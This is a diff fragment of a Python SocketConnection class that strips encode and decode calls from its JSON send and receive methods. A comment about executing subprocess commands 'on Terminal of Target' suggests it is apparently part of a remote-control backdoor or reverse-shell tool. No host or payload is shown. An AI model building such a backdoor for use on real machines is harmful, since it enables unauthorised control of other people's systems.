@@ -12,12 +12,12 @@ class SocketConnection:
     # Sending Input
     def json_send(self,data):
         json_data = json.dumps(data)
-        self.connection.send(json_data.encode())
+        self.connection.send(json_data)
 
     # Processing Input
     def json_receive(self):
         json_data = self.connection.recv(1024)
-        return json.loads(json_data.decode())
+        return json.loads(json_data)
 
     # Getting Input by Creating a subprocess to execute on Terminal of Target
     def command_execution(self,command):
